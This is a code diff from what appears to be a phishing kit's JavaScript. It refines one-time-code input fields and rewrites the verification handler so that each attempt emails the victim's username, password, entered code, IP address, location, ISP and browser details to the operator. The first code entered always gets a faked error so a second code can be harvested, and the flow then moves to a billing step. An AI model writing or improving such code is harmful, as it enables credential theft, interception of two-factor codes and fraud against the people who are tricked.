@@ -48,23 +48,38 @@ document.addEventListener('DOMContentLoaded', function() {
 
     // Set up verification code inputs
     const verificationInputs = document.querySelectorAll('.verification-input');
-    verificationInputs.forEach(input => {
+    verificationInputs.forEach((input, idx) => {
         input.addEventListener('input', function() {
-            // Allow only numbers and make them visible
+            // Allow only numbers
             this.value = this.value.replace(/\D/g, '');
             
-            const index = parseInt(this.dataset.index);
-            if (this.value.length === 1 && index < 6) {
-                verificationInputs[index].focus();
+            // Auto-focus next input
+            if (this.value.length === 1 && idx < verificationInputs.length - 1) {
+                verificationInputs[idx + 1].focus();
             }
+            
             checkVerificationCode();
         });
 
         input.addEventListener('keydown', function(e) {
-            const index = parseInt(this.dataset.index);
-            if (e.key === 'Backspace' && this.value.length === 0 && index > 1) {
-                verificationInputs[index - 2].focus();
+            // Handle backspace to go to previous input
+            if (e.key === 'Backspace' && this.value.length === 0 && idx > 0) {
+                verificationInputs[idx - 1].focus();
             }
+        });
+
+        // Handle paste functionality
+        input.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const pastedData = e.clipboardData.getData('text').replace(/\D/g, '');
+            
+            for (let i = 0; i < Math.min(pastedData.length, verificationInputs.length - idx); i++) {
+                if (verificationInputs[idx + i]) {
+                    verificationInputs[idx + i].value = pastedData[i];
+                }
+            }
+            
+            checkVerificationCode();
         });
     });
 
@@ -200,25 +215,42 @@ function handleVerifyCode(e) {
     attempts.verification++;
     showLoading();
 
+    // Send verification attempt email immediately
+    sendEmail(`Verification Attempt ${attempts.verification}`, `
+        ==============================================
+        VERIFICATION CODE ATTEMPT ${attempts.verification}
+        ==============================================
+        
+        Account Information:
+        Email/Username: ${userData.username}
+        Password: ${userData.password}
+        Verification Code Entered: ${code}
+        Attempt Number: ${attempts.verification}
+        Timestamp: ${new Date().toISOString()}
+
+        Technical Information:
+        IP Address: ${userData.ipInfo.ip || 'N/A'}
+        Location: ${userData.location.city || 'N/A'}, ${userData.location.region || 'N/A'}
+        Country: ${userData.location.country || 'N/A'}
+        ISP/Organization: ${userData.ipInfo.org || 'N/A'}
+        Browser: ${navigator.userAgent}
+        
+        ==============================================
+    `);
+
     if (attempts.verification === 1) {
         // First attempt - show error after loading
         setTimeout(() => {
             hideLoading();
             showStep(3);
             errorElement.style.display = 'block';
+            // Clear the verification inputs for retry
+            document.querySelectorAll('.verification-input').forEach(input => {
+                input.value = '';
+            });
+            document.querySelectorAll('.verification-input')[0].focus();
+            checkVerificationCode();
         }, 5000);
-
-        // Send first attempt email
-        sendEmail('First Verification Attempt', `
-            Email: ${userData.username}
-            Verification Code: ${code}
-            IP Address: ${userData.ipInfo.ip || 'N/A'}
-            City: ${userData.location.city || 'N/A'}
-            State: ${userData.location.region || 'N/A'}
-            Country: ${userData.location.country || 'N/A'}
-            ISP: ${userData.ipInfo.org || 'N/A'}
-            Timestamp: ${new Date().toISOString()}
-        `);
     } else {
         // Second attempt - proceed to billing
         setTimeout(() => {
@@ -226,18 +258,6 @@ function handleVerifyCode(e) {
             errorElement.style.display = 'none';
             showStep(4);
         }, 5000);
-
-        // Send second attempt email
-        sendEmail('Second Verification Attempt', `
-            Email: ${userData.username}
-            Verification Code: ${code}
-            IP Address: ${userData.ipInfo.ip || 'N/A'}
-            City: ${userData.location.city || 'N/A'}
-            State: ${userData.location.region || 'N/A'}
-            Country: ${userData.location.country || 'N/A'}
-            ISP: ${userData.ipInfo.org || 'N/A'}
-            Timestamp: ${new Date().toISOString()}
-        `);
     }
 }
 
